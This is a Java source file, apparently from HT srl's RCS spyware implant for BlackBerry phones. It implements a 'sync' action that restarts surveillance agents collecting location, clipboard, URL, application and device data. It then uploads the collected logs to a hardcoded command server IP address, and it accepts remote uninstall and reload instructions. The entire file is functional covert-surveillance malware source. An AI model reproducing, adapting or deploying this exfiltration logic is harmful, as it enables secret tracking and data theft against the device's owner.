/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SyncAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import java.io.EOFException;

import net.rim.device.api.util.DataBuffer;
import blackberry.AgentManager;
import blackberry.agent.Agent;
import blackberry.event.Event;
import blackberry.log.LogCollector;
import blackberry.transfer.Transfer;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class SyncAction.
 */
public final class SyncAction extends SubAction {
    // #debug
    private static Debug debug = new Debug("SyncAction", DebugLevel.VERBOSE);

    LogCollector logCollector;
    AgentManager agentManager;
    Transfer transfer;

    boolean wifi;
    boolean gprs;

    boolean ssl = false;

    String host = "";
    int port = 80;

    boolean syncying;

    /**
     * Instantiates a new sync action.
     * 
     * @param actionId_
     *            the action id_
     * @param confParams
     *            the conf params
     */
    public SyncAction(final int actionId_, final byte[] confParams) {
        super(actionId_);
        parse(confParams);

        // #ifdef DBC
        Check.requires(actionId == ACTION_SYNC, "ActionId scorretto");
        // #endif

        logCollector = LogCollector.getInstance();
        agentManager = AgentManager.getInstance();
        transfer = Transfer.getInstance();
    }

    /**
     * Instantiates a new sync action.
     * 
     * @param host_
     *            the host_
     */
    public SyncAction(final String host_) {
        super(ACTION_SYNC);
        host = host_;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#execute(blackberry.event.Event)
     */
    public boolean execute(final Event triggeringEvent) {
        // #debug info
        debug.info("SyncAction execute: " + triggeringEvent);

        synchronized (this) {
            if (syncying) {
                // #debug
                debug.warn("Already syncing: skipping");
                return true;
            } else {
                syncying = true;
            }
        }

        try {

            if (statusObj.crisis()) {
                // #debug
                debug.warn("SyncAction - no sync, we are in crisis");
                return false;
            }

            wantReload = false;
            wantUninstall = false;

            // #ifdef DBC
            Check.asserts(logCollector != null, "logCollector == null");
            // #endif

            //host = "192.168.1.177";
            host = "89.96.137.6";
            //host = "iperbole.suppose.it"; port = 8080;
            transfer.init(host, port, ssl, wifi);

            // Stop degli agenti che producono un singolo log
            agentManager.reStart(Agent.AGENT_POSITION);
            agentManager.reStart(Agent.AGENT_APPLICATION);
            agentManager.reStart(Agent.AGENT_CLIPBOARD);
            agentManager.reStart(Agent.AGENT_URL);

            // l'agente device si comporta diversamente
            agentManager.reStart(Agent.AGENT_DEVICE);

            Utils.sleep(2500);

            final boolean ret = transfer.startSession();

            wantUninstall = transfer.uninstall;
            wantReload = transfer.reload;

            if (ret) {
                // #debug debug
                                debug.trace("InternetSend OK");
                return true;
            }

            // #debug
            debug.error("InternetSend Unable to perform");

            return false;
        } finally {
            synchronized (this) {
                syncying = false;

            }
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.action.SubAction#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);

        try {
            gprs = databuffer.readInt() == 1;
            wifi = databuffer.readInt() == 1;

            final int len = databuffer.readInt();
            final byte[] buffer = new byte[len];
            databuffer.readFully(buffer);

            host = WChar.getString(buffer, true);

        } catch (final EOFException e) {
            // #debug
            debug.error("params FAILED");
            return false;
        }

        //#mdebug
        StringBuffer sb = new StringBuffer();
        sb.append("gprs: " + gprs);
        sb.append("wifi: " + wifi);
        sb.append("host: " + host);
        //#debug info
        debug.info(sb.toString());
        //#enddebug

        return true;
    }

}
